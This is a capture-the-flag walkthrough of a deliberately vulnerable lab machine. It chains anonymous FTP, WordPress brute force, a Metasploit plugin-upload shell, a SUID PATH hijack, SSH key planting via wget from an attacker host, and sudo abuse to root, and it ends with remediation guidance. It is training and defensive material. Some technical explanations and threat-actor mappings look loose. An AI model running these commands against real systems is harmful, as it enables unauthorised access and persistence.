# UA: Literally Vulnerable — The Name Says It All

Alright guys!! The name "Literally Vulnerable" is not ironic at all, no cap. This Ukrainian-themed box chains anonymous FTP dumping a password list, WordPress brute force with those exact creds, Metasploit plugin upload for Meterpreter, a SUID binary PATH hijack for lateral movement, SSH key injection, base64-encoded creds in a hidden dir, and a sudo rule that lets you replace an HTML file with bash. Literally every misconfiguration you can think of, stacked on top of each other. fr fr, this one teaches fundamentals like no other. Big ups to the creator.

| Field | Value |
|---|---|
| **Level** | Easy/Medium |
| **Target VM** | UA: Literally Vulnerable |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ua-literally-vulnerable,508/ |
| **Techniques** | FTP anonymous login, WordPress user enumeration, WPScan brute force, Metasploit wp_admin_shell_upload, SUID PATH hijack, SSH key injection, base64 credential recovery, sudo HTML file replacement |
| **CVEs** | CWE-287 (FTP anonymous auth), CWE-434 (WordPress plugin upload RCE), CWE-269 (sudo misconfiguration), CWE-522 (base64 stored credentials) |
| **APT Groups** | FIN7 — uses credential stuffing and web application exploitation for initial access; APT28 (Fancy Bear) — Ukrainian-themed lure; demonstrates layered credential chain tactics used by commodity ransomware affiliates |

---

## Attack Summary

```
nmap → FTP 21 (anonymous), SSH 22, Nginx 80, Apache 65535 (WordPress)
  → FTP anonymous login → backupPasswords list
  → /etc/hosts: literally.vulnerable → wpscan enum → notadmin, maybeadmin
  → wpscan brute with backupPasswords → notadmin:Pa$$w0rd13!&
  → Metasploit wp_admin_shell_upload → Meterpreter (www-data)
  → SUID /home/doe/itseasy (runs 'pwd' without full path)
  → PATH/PWD hijack → shell as john
  → SSH key injection → stable SSH as john
  → ~/.local/share/tmpFiles/myPassword → base64 -d → john password
  → user.txt
  → sudo -l: john can run /var/www/html/test.html as root
  → echo "/bin/bash" > /var/www/html/test.html → sudo → root
  → /root/root.txt
```

---

## Methodology

1. Full port scan to identify all services (FTP, SSH, Nginx, WordPress on high port)
2. FTP anonymous login: retrieve password list
3. `/etc/hosts` configuration for vhost resolution
4. WordPress user enumeration with WPScan
5. WordPress brute force with retrieved password list
6. Metasploit Meterpreter shell via `wp_admin_shell_upload`
7. SUID binary enumeration: identify PATH hijack vector in `/home/doe/itseasy`
8. Lateral movement to user `john` via PATH/PWD manipulation
9. SSH key injection for stable session as `john`
10. Hidden credential discovery via base64 decoding
11. Sudo rule abuse: overwrite HTML file with bash, escalate to root

---

## Step 1 — Host Discovery and Full Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.103

nmap -p- -A 192.168.1.103
```

```
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3 (anonymous login allowed)
22/tcp    open  ssh      OpenSSH 7.x
80/tcp    open  http     nginx
65535/tcp open  http     Apache 2.4.x (WordPress)
```

Non-standard port 65535 for Apache is a deliberate attempt to hide the WordPress install. Nmap's `-p-` flag ensures you catch it. Always do full-port scans, dude.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — FTP Anonymous Login and Password List

```bash
ftp 192.168.1.103
# Username: anonymous
# Password: (blank or anonymous)

ftp> ls -la
ftp> get backupPasswords
ftp> bye

cat backupPasswords
```

The file contains a wordlist of passwords. The server is running vsftpd 3.0.3 with `anonymous_enable=YES` and no restrictions on file download. This is a textbook misconfiguration: the FTP server is essentially a public file share serving attacker-ready credential material.

**Real-world note:** Anonymous FTP was decommissioned at most organizations in the early 2000s, yet it still appears in penetration tests regularly, especially on legacy Linux servers that shipped with vsftpd enabled by default. The CISA 2022 advisory on internet-exposed services highlights FTP as a persistent risk.

**MITRE ATT&CK:** T1078.001 — Valid Accounts: Default Accounts; T1039 — Data from Network Shared Drive

---

## Step 3 — WordPress Enumeration via VHost

WordPress is hosted on port 65535 at `/phpcms`. It requires VHost resolution:

```bash
echo "192.168.1.103 literally.vulnerable" >> /etc/hosts
```

Enumerate users with WPScan:

```bash
wpscan --url http://literally.vulnerable:65535/phpcms/ --enumerate u
```

Two users discovered: `notadmin` and `maybeadmin`. The usernames themselves hint that neither should have admin privileges but probably do.

**MITRE ATT&CK:** T1592 — Gather Victim Host Information; T1589.001 — Gather Victim Identity Information: Credentials

---

## Step 4 — WordPress Password Brute Force

```bash
wpscan --url http://literally.vulnerable:65535/phpcms/ \
  -U notadmin,maybeadmin \
  -P backupPasswords
```

Result:

```
[SUCCESS] notadmin : Pa$$w0rd13!&
```

After logging in, check draft posts in the WordPress dashboard: draft pages sometimes contain developer notes, internal paths, or additional credentials.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 5 — Metasploit Shell via WordPress Plugin Upload

```bash
msfconsole -q
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS literally.vulnerable
set RPORT 65535
set TARGETURI /phpcms
set USERNAME notadmin
set PASSWORD Pa$$w0rd13!&
exploit
```

Meterpreter session opens as `www-data`:

```bash
meterpreter > sysinfo
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The `wp_admin_shell_upload` module zips a PHP plugin, uploads it through the WordPress admin interface, and activates it. This is exactly how ransomware operators compromise hosted WordPress sites: authenticate, install a malicious plugin, execute.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — SUID Binary PATH Hijack (Lateral Movement to john)

Enumerate SUID binaries from the Meterpreter shell:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Finds `/home/doe/itseasy` owned by `john` with SUID bit. Inspect it:

```bash
strings /home/doe/itseasy
# References to 'pwd' (without absolute path)
cat /home/doe/noteFromAdmin
# Tells doe that system binaries were removed
```

The binary calls `pwd` without a full path, so it searches `$PATH` first. Set `$PWD` to a shell command via export trick:

```bash
export PWD=$(/bin/bash)
cd /home/doe
./itseasy
```

A shell as `john` is returned. This works because the SUID binary executes as `john`, and the PATH hijack causes it to run our controlled command.

**Alternative approach:** Create a fake `pwd` binary in a writable directory and prepend it to `$PATH`:

```bash
echo '/bin/bash' > /tmp/pwd
chmod +x /tmp/pwd
export PATH=/tmp:$PATH
/home/doe/itseasy
```

**MITRE ATT&CK:** T1574.007 — Hijack Execution Flow: Path Interception by PATH Environment Variable

---

## Step 7 — SSH Key Injection for Stable Access

The lateral movement shell may be unstable. Inject an SSH key:

```bash
# On attacker:
ssh-keygen -t rsa -f /tmp/johnkey -N ""
cat /tmp/johnkey.pub
python3 -m http.server 8000

# On target as john:
mkdir -p /home/john/.ssh
chmod 700 /home/john/.ssh
wget http://192.168.1.ATTACKER:8000/johnkey.pub -O /home/john/.ssh/authorized_keys
chmod 600 /home/john/.ssh/authorized_keys

# On attacker:
ssh -i /tmp/johnkey john@192.168.1.103
```

SSH key injection is cleaner than a reverse shell: no listener needed, survives reboots, and is harder to spot in process listings.

**MITRE ATT&CK:** T1098.004 — Account Manipulation: SSH Authorized Keys

---

## Step 8 — Hidden Credential Discovery via Base64

Enumerate hidden files as `john`:

```bash
find /home/john -name ".*" -type d 2>/dev/null
ls -la /home/john/.local/share/tmpFiles/
cat /home/john/.local/share/tmpFiles/myPassword
```

The file contains a base64-encoded string:

```bash
echo "am9objpZWlckczhZNDlJQiNaWko=" | base64 -d
# john:YZW$s8Y49IB#ZZJ
```

Read the user flag:

```bash
cat /home/john/user.txt
```

Security through obscurity: base64 is encoding, not encryption. Anyone with read access to the file instantly recovers the plaintext.

**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials in Files

---

## Step 9 — Privilege Escalation: Sudo HTML File Replacement

```bash
sudo -l
# User john may run: (root) NOPASSWD: /var/www/html/test.html
```

This rule allows `john` to execute `/var/www/html/test.html` as root. But `test.html` is inside the web root, which `www-data` (and `john` via the earlier shell) can write to. Replace it with a bash invocation:

```bash
echo "/bin/bash" > /var/www/html/test.html
chmod 755 /var/www/html/test.html
sudo /var/www/html/test.html
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. The machine lives up to its name: literally every sudo config anti-pattern in one rule.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Notes |
|---|---|---|---|
| WordPress credential | notadmin:Pa$$w0rd13!& | WPScan brute + FTP password list | Admin login on port 65535 |
| john base64 password | john:YZW$s8Y49IB#ZZJ | ~/.local/share/tmpFiles/myPassword | Base64 encoded |
| user.txt | (varies per instance) | /home/john/user.txt | After lateral movement |
| root.txt | (varies per instance) | /root/root.txt | After sudo privesc |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | FTP anonymous login exposing password list | Thousands of production FTP servers still allow anonymous access; credential list exposure directly enables follow-on attacks | Disable anonymous FTP (`anonymous_enable=NO` in vsftpd.conf); migrate to SFTP with key auth |
| 2 | WordPress brute force with application-specific wordlist | Attackers reuse leaked passwords against CMS logins; WPScan is in every attacker toolkit | Enforce 2FA on WordPress admin; add fail2ban or rate limiting to wp-login.php |
| 3 | Metasploit wp_admin_shell_upload via stolen creds | Ransomware groups use authenticated plugin upload as standard WordPress compromise technique | Keep WordPress and plugins updated; monitor wp-content/plugins for unexpected files |
| 4 | SUID binary with relative path (PATH hijack) | PATH hijack via SUID is a medium-complexity privesc found regularly in audits of custom internal tools | Always use absolute paths in SUID binaries; audit SUID permissions quarterly |
| 5 | Sudo rule on web-writable file | sudo on files writable by lower-privileged users creates trivial privesc; auditors flag this immediately | Never grant sudo on files inside the web root; test sudoers with `sudo -l` from every account |
| 6 | Base64-encoded password in hidden directory | Base64 is encoding, not encryption; anyone with filesystem read access recovers the plaintext instantly | Use a secrets manager (HashiCorp Vault, AWS Secrets Manager); never store cleartext or base64 passwords on disk |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Account Manipulation: SSH Authorized Keys | T1098.004 |
| Lateral Movement | Lateral Movement | Hijack Execution Flow: PATH Interception | T1574.007 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable anonymous FTP**: set `anonymous_enable=NO` in `/etc/vsftpd.conf`; restart vsftpd; migrate to SFTP with key auth
2. **WordPress hardening**: enable 2FA on admin accounts; install fail2ban for wp-login.php; move login to non-standard URL; update all plugins
3. **Remove Metasploit-planted plugin**: check `wp-content/plugins/` for unexpected directories; remove and audit all installed plugins
4. **Audit SUID binaries**: `find / -perm -4000 -type f 2>/dev/null`; remove SUID from non-essential binaries; ensure all SUID binaries use absolute paths
5. **Fix sudoers**: remove NOPASSWD grants on web-writable files; restrict sudo to specific, safe commands with password requirement
6. **Remove filesystem-stored credentials**: purge base64 files; implement secrets management; rotate all exposed passwords

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all FTP services and web applications; identify authentication mechanisms |
| Protect | Access Control | Disable anonymous FTP; enforce 2FA on WordPress admin; restrict sudo |
| Protect | Data Security | Remove plaintext/base64 credentials from filesystem; implement secrets management |
| Detect | Anomalies and Events | Monitor FTP logins; alert on new WordPress plugin installs; log sudo usage |
| Respond | Response Planning | Remove webshells; rotate all exposed credentials; patch WordPress |
| Recover | Recovery Planning | Rebuild compromised host; audit all accounts and file permissions |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Disable anonymous FTP; restrict web directory write permissions |
| AC-6 | Least Privilege | Remove SUID from custom binaries; restrict sudo to minimal, safe commands |
| IA-5 | Authenticator Management | Rotate all exposed credentials; enforce strong passwords; enable 2FA |
| CM-7 | Least Functionality | Disable anonymous FTP; restrict file upload to validated types |
| SC-28 | Protection of Information at Rest | Never store credentials in plain text or base64 on the filesystem |
| SI-3 | Malicious Code Protection | Monitor for unexpected PHP files in web directories; scan for webshells |

### CISA KEV

The combination of WordPress plugin upload RCE and anonymous FTP credential exposure maps to patterns in CISA Alert AA22-074A describing threat actor initial access via web application vulnerabilities. The sudo misconfiguration pattern aligns with post-exploitation techniques documented in CISA advisory AA21-116A on privilege escalation.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (disable anonymous FTP; restrict sudo)
- **D3-OAM** — Operating System Administrative Management (SUID auditing; sudoers hardening)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in web-accessible paths)

---

## Final Thoughts

UA: Literally Vulnerable earns its name completely. Every vulnerability on this machine is a textbook example of what-not-to-do, stacked in a chain that requires no zero-days, no advanced exploitation: just enumeration, patience, and knowing your GTFOBins. The FTP-to-WordPress-to-SUID-to-sudo chain is exactly the kind of attack path you find in real environments where security was never a priority.

The lesson: attackers do not need sophistication when defenders give them a roadmap. Fix the fundamentals.

Thanks guys!! (❍ᴥ❍ʋ)
